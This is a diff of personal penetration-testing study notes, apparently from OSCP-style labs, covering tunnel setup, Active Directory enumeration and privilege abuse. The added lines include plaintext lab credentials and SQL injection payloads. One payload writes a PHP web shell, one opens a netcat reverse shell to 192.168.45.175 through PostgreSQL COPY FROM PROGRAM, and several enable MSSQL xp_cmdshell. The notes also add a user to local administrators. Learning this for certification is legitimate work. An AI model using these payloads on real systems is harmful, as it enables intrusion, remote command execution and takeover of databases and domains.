@@ -16,7 +16,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 for the email they will either provide you:
 - the email technology used behind like mail outlook exploit (htb:mail)
 - or they will mention in the email the used technology (ospg:hepet)
-- or it will be general like knowing it is windows micros or more general library (offsec:2023)
+- or it will be general like knowing it is windows micros or more general library windo (offsec:2023)
 ---------------------------------------------
 (ospg:kevin)
 nice way of generating msfvenom shell with no bad chars
@@ -171,18 +171,18 @@ another one  that worked
 https://shivrajan.medium.com/use-command-line-tools-in-php-960214715b73
 ------------------------------------------------
 ligolo setup
-sudo ip tuntap add user kali mode tun tits
-sudo ip link set tits up
-sudo ip route add 240.0.0.1/32 dev tits
-sudo ip route add 172.16.228.0/24/24 dev tits
+sudo ip tuntap add user kali mode tun sus
+sudo ip link set sus up
+sudo ip route add 240.0.0.1/32 dev sus
+sudo ip route add 172.16.118.0/24 dev sus
 
 
 delete 
-sudo ip link set sus down
-sudo ip tuntap del dev sus mode tun
-sudo ip route del 240.0.0.1/32 dev sus
-sudo ip route del 10.10.111.0/24 dev sus
-sudo ip route del 172.16.228.0/24 dev sus
+sudo ip link set ligolo down
+sudo ip tuntap del dev ligolo mode tun
+sudo ip route del 240.0.0.1/32 dev ligolo
+sudo ip route del 10.10.111.0/24 dev ligolo
+sudo ip route del 172.16.118.0/24 dev ligolo
 
 
 
@@ -558,7 +558,8 @@ cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
 *************************[workstation specifics]*************************
 [there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
 
-
+(offsec:shiftdel) interesting way abusing linux absolute path
+---------------------------------
 (offsec:medtech) 
 after modifing mofifiable executable waiting for a scheduler time if no trager check if you can restart as the scheduler may run every restart
 
@@ -814,6 +815,16 @@ $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
 $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
 $dirsearcher.FindAll()
 
+// sometimes the $PDC will not appear in the object in the machine so you have to provide manually
+$direntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.228.70/DC=corp,DC=com","corp\stephanie","LegmanTeamBenzoin!!")
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.FindAll()
+
+// this is manually but better than get-objectacl as it shows the identityreference
+$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.228.70/CN=Management Department,OU=Departments,DC=corp,DC=com", "corp\stephanie", "LegmanTeamBenzoin!!")
+$acl = $direntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+$acl | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select IdentityReference, ActiveDirectoryRights
+
 // 0x30000000 (decimal 805306368), enumerate all users in the domain
 $dirsearcher.filter="samAccountType=805306368"
 $dirsearcher.FindAll()
@@ -846,6 +857,7 @@ Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurit
 Get-NetSession -ComputerName client74
 // We can obtain the IP address and port number of applications running on servers integrated with // AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-NetUser | select cn
 // conver sid to name 
 Convert-SidToName 
 // genericall on a group add yourself and check (group specifics)
@@ -853,6 +865,11 @@ net group "Management Department" stephanie /add /domain
 Get-NetGroup "Management Department" | select member
 // finding what group specifics we have on x
 Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+// same Get-ObjectAcl thing but with credentials
+$cred = New-Object System.Management.Automation.PSCredential("corp\stephanie", (ConvertTo-SecureString "LegmanTeamBenzoin!!" -AsPlainText -Force))
+Get-ObjectAcl -Identity "Management Department" -Server 192.168.228.70 -Credential $cred |
+Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | 
+Select-Object SecurityIdentifier, ActiveDirectoryRights
 // list all shares that you have access to
 Find-DomainShare -CheckShareAccess
 -----------------------------------------------------------
@@ -1002,7 +1019,6 @@ set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windo
 ----------------------------------------------------------------------------------------
 allow rdp 
 
-gp4.exe -cmd "cmd /c net user administrator Test@123"
 
 gp4.exe -cmd "cmd /c net localgroup administrators /add mamathere"
 
@@ -1222,12 +1238,20 @@ https://medium.com/@aslam.mahimkar/blind-sqli-to-rce-remote-code-execution-jarvi
 
 
 +++++++++++++++++++++++++++
+SQL injection 
 
+once you identify sql injection either by debuggubgg enabled or sleep etc
+
+you now need to know the underlying sql technology to use whatever syntax to either write a file ussing mysql and postgresql or the table exploit on postgresql or xp_cmdshell exploit in mssql
+
+
++++++++++++++++++++++++++++++
 
 SQL boxes:
 (ospg:matrimony)
 like sqlmap: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
 indork: site:medium.com "';waitfor"
+
 
 sqlmap but with burpsuite
 https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434
@@ -1254,3 +1278,31 @@ https://medium.com/@mehrnoush/behind-the-scenes-of-problem-solving-a-case-study-
 emojis for forensics:
 https://res260.medium.com/%EF%B8%8F-%EF%B8%8F-windows-forensics-how-to-retrieve-and-parse-the-emoji-picker-history-in-the-filesystem-d3766282325a
 nice for my wevutil powershell decode:https://medium.com/@0x8080/cyber-apocalypse-ctf-2022-golden-persistence-f7bf76c68f26 indork: site:medium.com "ntuser.dat"
+
+-------------------------
+SQL INJECTIONS EXPLOITS FOR DIFFERENT DTABASES:
+
+WRITE TO A FILE (ABUSE USER PRIVILEGE):
+
+postgresql write to file payload
+' UNION SELECT '<?php system($_GET["cmd"]); %>',null,null,null,null,null; COPY (SELECT '<%3fphp system($_GET["cmd"]); %>') TO '/var/www/html/shell.php'-- -
+
+
+EXPLOIT A DATABASE KNOWN (SPECIFIC) EXPLOITS (ABUSE CURRENT USER PERMISSION ON THE DATABASE):
+
+postgresql specific exploit: 
+';DROP TABLE IF EXISTS commandexec;CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/bash 192.168.45.175 4444';--
+
+mysql
+
+
+mssql:
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
+admin' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping <collab_url>.burpcollaborator.net'--+
+
+
+-----------------------------
+(ospg:shiftdel) the exploit is very interesting you have to look it up more
